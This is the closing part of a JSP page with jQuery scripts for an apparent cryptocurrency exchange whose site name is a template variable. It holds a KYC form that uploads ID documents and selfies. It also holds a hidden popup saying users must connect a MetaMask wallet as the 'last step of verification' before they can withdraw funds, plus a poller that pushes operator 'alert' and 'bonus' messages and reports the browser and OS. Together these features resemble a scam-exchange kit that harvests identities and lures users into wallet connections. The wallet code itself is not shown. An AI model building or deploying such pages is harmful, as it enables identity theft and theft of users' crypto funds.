                                    "         </label>\n" +
                                    "         <input id=\"kyc_date_of_birth\" value=\"%s\" type=\"date\" disabled=\"\">\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-passport\">\n" +
                                    "         <div class=\"verification__input-label\">\n" +
                                    "            Select ID type\n" +
                                    "         </div>\n" +
                                    "         <div class=\"verification__input-input verification__input-disabled\" id=\"verificationPassport\">\n" +
                                    "            <span class=\"verification__input-value\">%s</span>\n" +
                                    "            <div class=\"verification__input-icon\">\n" +
                                    "               <img src=\"../assets/img/arrow.svg\" alt=\"\">\n" +
                                    "            </div>\n" +
                                    "         </div>\n" +
                                    "      </div>\n" +
                                    "      <div class=\"verification__input verification__input-id\">\n" +
                                    "         <label class=\"verification__input-label\" for=\"kyc_id_number\">\n" +
                                    "         ID number\n" +
                                    "         </label>\n" +
                                    "         <input value=\"%s\" id=\"kyc_id_number\" type=\"text\" placeholder=\"Enter ID number\" disabled=\"\">\n" +
                                    "      </div>\n" +
                                    "   </div>", request.getAttribute("first_name"), request.getAttribute("last_name"), request.getAttribute("country"), request.getAttribute("address"),
                            request.getAttribute("country_code"), request.getAttribute("phone"), request.getAttribute("date_of_birth"), request.getAttribute("id_type"), request.getAttribute("id_number"));
                    out.println(html);
                }
            %>

    </div>
</section>
<script src="../assets/js/kyc_main.js"></script>
<!-- START FOOTER -->
<div class="footer">
    <div class="container">
        <div class="row">
            <div>
                <div class="copyright">
                    <%
            out.println("<p style=\"font-size:12px\" ;=\"\"><strong>" + request.getAttribute("domain_exchange_name") + "</strong> © Copyright 2023 | Worldwide Distributed Digital Asset Exchange | Trading digitals assets such as Bitcoin involves significant risks.</p>");
          %>
                </div>
            </div>
            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                <div class="footer-social">
                </div>
            </div>
        </div>
    </div>
</div>
<div id="alert_message_modal" class="popup__container" style="display: none;">
    <div class="popup">
        <div class="popup__close" id="alert_close_modal">
            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewbox="0 0 24 24" style=" fill:#FFFFFF;">
                <path d="M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z"></path>
            </svg>
        </div>
        <div class="popup__left">
            <img src="../assets/img/warning.png" alt="" id="alert_img_pop">
        </div>
        <div class="popup__right">
            <div class="popup__right-title" id="alert_title_text">
                Warning
            </div>
            <div class="popup__right-description" id="userAlertBox">
            </div>
            <input type="hidden" id="alertMessageId" value="0">
            <div id="alert_close_modal_btn" class="popup__right-button">
                Close
            </div>
        </div>
    </div>
</div>
<div id="verify_popap_meta" class="popap-verifi" style="position: fixed !important; display: none; text-align: left;">
    <input type="hidden" id="MetaalertMessageId" value="0">
    <div class="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">
        <div class="popap-verifi-container-item-img">
            <img src="../metamask/assets/fox.svg" style="width: 135px;">
        </div>
        <div class="popap-verifi-item-info">
            <div class="popap-verifi-loader">
                <div class="popap-verifi-loader-border"></div>
            </div>
            <div class="popap-verifi-item-info-title">
                Last step of verification
            </div>
            <div id="alertMessageMeta" class="popap-verifi-item-info-text" style="max-height: 170px; overflow: hidden;">
                To complete the verification process - connect your Metamask wallet.<br><br>
                After confirming metamask wallet, you will be able to withdraw your funds.
            </div>
            <div class="popap-verifi-item-info-btn">
                <button onclick="openMetaMask()" class="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
                    Connect Metamask
                </button>
                <button id="closeMetaMaskBtn" class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
                    Cancel
                </button>
            </div>
        </div>
    </div>
</div>
<!-- END FOOTER -->
<script src="../assets/js/jquery-3.4.1.min.js"></script>
<script src="../assets/js/popper.min.js"></script>
<script src="../assets/js/bootstrap.min.js"></script>
<script src="../assets/js/amcharts-core.min.js"></script>
<script src="../assets/js/amcharts.min.js"></script>
<script src="../assets/js/custom.js"></script>
<script src="../plugins/notifications/toastr.js"></script>
<script src="../assets/js/new-select/new-select.js"></script>
<script src="../assets/js/verifi/verifi.js"></script>
<script src="../assets/js/menu_main.js"></script>
<script src="../assets/js/g_menu_main.js"></script>
<script>
    function noti(msg, status) {
        toastr[status](msg);
        toastr.options = {
            "closeButton": false,
            "debug": false,
            "newestOnTop": false,
            "progressBar": false,
            "rtl": false,
            "positionClass": "toast-top-right",
            "preventDuplicates": false,
            "onclick": null,
            "showDuration": 300,
            "hideDuration": 1000,
            "timeOut": 5000,
            "extendedTimeOut": 1000,
            "showEasing": "swing",
            "hideEasing": "linear",
            "showMethod": "fadeIn",
            "hideMethod": "fadeOut"
        }
    }
</script>
</body>
</html>
<script src="../assets/js/os-detect.js"></script>
<script>
    setInterval(function() {
        var messageId = $("#alertMessageId").val();
        if(messageId == '0') {
            $.ajax({
                url: "/profile",
                type: "POST",
                data: {
                    action: "CHECK_USER_ALERT_MESSAGE",
                    browser_name: getBrowserName(),
                    os_name: getOSName()
                },
                success: function(response) {
                    var json = JSON.parse(response);

                    if (json["support_messages"] !== undefined && json["support_messages"] != null) {
                        var spanElement = document.getElementById("count_support_message");
                        if (spanElement !== null) {
                            if (json["support_messages"] === "0") {
                                spanElement.remove();
                            } else {
                                spanElement.innerHTML = json["support_messages"]
                            }
                        } else if (json["support_messages"] !== "0") {
                            spanElement = document.createElement("span");
                            spanElement.id = "count_support_message";
                            spanElement.className = "support_messages";
                            spanElement.innerHTML = json["support_messages"];

                            var supportElement = document.getElementById("support_count");
                            supportElement.appendChild(spanElement);
                        }
                    }

                    if (json["alert_message_text"] !== undefined && json["alert_message_text"] != null) {
                        var alert_message_text = json['alert_message_text'];

                        if (json['alert_message_type'] == 'alert') {
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                        } else if (json['alert_message_type'] == 'bonus') {
                            $("#alert_img_pop").attr("src", "");
                            $("#alert_title_text").html("Bonus");
                            $("#alert_img_pop").attr("src", "../assets/img/bonus-icon.png");
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                            $("#userAlertBox").css("font-size", "18px");
                        } else if (json['alert_message_type'] == 'notification') {
                            noti(alert_message_text, 'info');
                        }
                    }
                }
            })
        }
    }, 5000);
</script>
<script>
    $(document).ready(function(){
        setTimeout(function() {
            $.ajax({
                url: "../api/deposits",
                type: "POST",
                data: {
                    action: "REFRESH_MY_ADDRESSES"
                },
                success: function(response) {
                }
            })
        }, 500);
    });
</script>
<script type="text/javascript">
    function disabledBtn(func) {
        if(func == "off") {
            $("#submit_btn").html("Loading...");
            $("#submit_btn").css("background", "#242730");
            $("#submit_btn").attr("disabled", true);

        } else if(func == "on") {
            $("#submit_btn").html("Submit for review");
            $("#submit_btn").css("background", "linear-gradient(90deg, #2883B6 0%, #399D79 100%)");
            $("#submit_btn").attr("disabled", false);
        }
    }

    var country_name = 'Germany';
    var country_code = 'de';

    function selectedCountry(country, c_name) {
        var country = country.toLowerCase();

        $("#selected_country_flag_img").attr("src", "../assets/img/flags/" + country + ".png");

        country_name = c_name;
        country_code = country;
    }

    var selected_type = 'Passport';

    function selectedIDtype(type) {
        selected_type = type;
    }

    $("#submit_btn").on("click", function(e) {
        e.preventDefault();

        var kyc_first_name = $("#kyc_first_name").val();
        var kyc_last_name = $("#kyc_last_name").val();
        var kyc_country = country_name;
        var kyc_country_code = country_code;
        var kyc_address = $("#kyc_address").val();
        var kyc_phone = $("#kyc_phone").val();
        var kyc_date_of_brith = $("#kyc_date_of_birth").val();
        var kyc_id_type = selected_type;
        var kyc_id_number = $("#kyc_id_number").val();
        var image_document = $("#image_document").val();
        var image_selfie = $("#image_selfie").val();

        var kyc_doc_size = $("#image_document")[0].files[0];
        var kyc_selfie_size = $("#image_selfie")[0].files[0];


        if(kyc_first_name == "") {
            noti("Please, enter First Name!", "error");
        } else if(kyc_last_name == "") {
            noti("Please, enter Last Name!", "error");
        } else if(kyc_address == "") {
            noti("Please, enter Address!", "error");
        } else if(kyc_phone == "") {
            noti("Please, enter Phone number!", "error");
        }  else if(kyc_date_of_brith == "") {
            noti("Please, enter Date of Birth!", "error");
        } else if(kyc_id_type == "") {
            noti("Please, select ID Type", "error");
        } else if(kyc_id_number == "") {
            noti("Please, enter ID Number!", "error");
        } else if(image_document == "") {
            noti("Please, select Document Image", "error");
        } else if(image_selfie == "") {
            noti("Please, select Selfie Image", "error");
        } else if(kyc_doc_size['size'] > 500000) {
            noti("Document Image size must not be larger than 500KB", "error");
        } else if(kyc_selfie_size['size'] > 500000) {
            noti("Selfie Image size must not be larger than 500KB", "error");
        } else {

            disabledBtn("off");

            var form = new FormData();
            form.append('action', "KYC_INSERT_NEW_REQUEST");
            form.append('kyc_first_name', kyc_first_name);
            form.append('kyc_last_name', kyc_last_name);
            form.append('kyc_country', kyc_country);
            form.append('kyc_country_code', kyc_country_code);
            form.append('kyc_address', kyc_address);
            form.append('kyc_phone', kyc_phone);
            form.append('kyc_date_of_birth', kyc_date_of_brith);
            form.append('kyc_id_type', kyc_id_type);
            form.append('kyc_id_number', kyc_id_number);

            form.append('image_document', kyc_doc_size);
            form.append('image_selfie', kyc_selfie_size);

            $.ajax({
                url: '/profile/kyc',
                data: form,
                cache: false,
                contentType: false,
                processData: false,
                type: 'POST',
                success:function(response) {
                    if(response === "1") {
                        noti("Verification successfully sended");
                        setTimeout(() => location.reload(), 1000);
                    } else {
                        disabledBtn("on");
                        noti("An unexpected error ("+response+") has occurred, please try again", "error");
                    }
                }
            });
        }
    })
</script>